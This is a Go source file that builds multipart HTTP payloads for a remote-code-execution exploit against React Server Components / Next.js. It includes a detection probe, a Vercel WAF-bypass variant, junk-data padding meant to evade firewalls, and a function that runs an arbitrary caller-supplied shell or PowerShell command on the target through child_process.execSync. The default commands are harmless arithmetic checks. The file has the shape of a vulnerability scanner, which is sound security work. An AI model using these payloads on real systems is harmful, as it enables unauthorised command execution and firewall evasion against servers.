package payload

import (
	"fmt"
	"math/rand"
	"strings"
)

const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad"

// BuildSafePayload builds the safe multipart payload for side-channel detection
func BuildSafePayload() (body string, contentType string) {
	body = fmt.Sprintf(
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" +
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n" +
			"{}\r\n" +
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n" +
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n" +
			"[\"$1:aa:aa\"]\r\n" +
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
	)
	contentType = fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
	return body, contentType
}

// BuildVercelWAFBypassPayload builds payload for Vercel WAF bypass
func BuildVercelWAFBypassPayload() (body string, contentType string) {
	part0 := `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
		`"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":` +
		`"var res=process.mainModule.require('child_process').execSync('echo $((41*271))').toString().trim();;` +
		`throw Object.assign(new Error('NEXT_REDIRECT'),{digest: ` + "`" + `NEXT_REDIRECT;push;/login?a=${res};307;` + "`" + `});",` +
		`"_chunks":"$Q2","_formData":{"get":"$3:\"$$:constructor:constructor"}}}`

	body = fmt.Sprintf(
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
			"%s\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"\"$@0\"\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
			"[]\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"3\"\r\n\r\n"+
			"{\"\\\"\\u0024\\u0024\":{}}\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
		part0,
	)
	contentType = fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
	return body, contentType
}

// BuildRCEPayload builds the RCE exploit payload
func BuildRCEPayload(windows bool, wafBypass bool, wafBypassSizeKB int) (body string, contentType string) {
	var cmd string
	if windows {
		cmd = `powershell -c \"41*271\"`
	} else {
		cmd = `echo $((41*271))`
	}

	prefixPayload := fmt.Sprintf(
		"var res=process.mainModule.require('child_process').execSync('%s')"+
			".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"+
			"{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
		cmd,
	)

	part0 := fmt.Sprintf(
		`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,`+
			`"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"%s",`+
			`"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`,
		prefixPayload,
	)

	var parts []string

	// Add junk data for WAF bypass
	if wafBypass {
		junk := generateJunkData(wafBypassSizeKB * 1024)
		paramName := generateRandomString(12)
		parts = append(parts, fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"%s\"\r\n\r\n"+
				"%s\r\n",
			paramName, junk,
		))
	}

	parts = append(parts,
		fmt.Sprintf(
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
				"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
				"%s\r\n", part0,
		),
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"\"$@0\"\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
			"[]\r\n",
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
	)

	body = strings.Join(parts, "")
	contentType = fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
	return body, contentType
}

// BuildExploitPayload builds a payload with custom command execution
func BuildExploitPayload(command string, windows bool) (body string, contentType string) {
	var cmd string
	if windows {
		cmd = fmt.Sprintf(`powershell -c \"%s\"`, command)
	} else {
		cmd = command
	}

	prefixPayload := fmt.Sprintf(
		"var res=process.mainModule.require('child_process').execSync('%s')"+
			".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT'),"+
			"{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});",
		cmd,
	)

	part0 := fmt.Sprintf(
		`{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,`+
			`"value":"{\"then\":\"$B1337\"}","_response":{"_prefix":"%s",`+
			`"_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}`,
		prefixPayload,
	)

	body = fmt.Sprintf(
		"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"0\"\r\n\r\n"+
			"%s\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"1\"\r\n\r\n"+
			"\"$@0\"\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad\r\n"+
			"Content-Disposition: form-data; name=\"2\"\r\n\r\n"+
			"[]\r\n"+
			"------WebKitFormBoundaryx8jO2oVc6SWP3Sad--",
		part0,
	)

	contentType = fmt.Sprintf("multipart/form-data; boundary=%s", boundary)
	return body, contentType
}

func generateJunkData(size int) string {
	const charset = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
	b := make([]byte, size)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}

func generateRandomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}
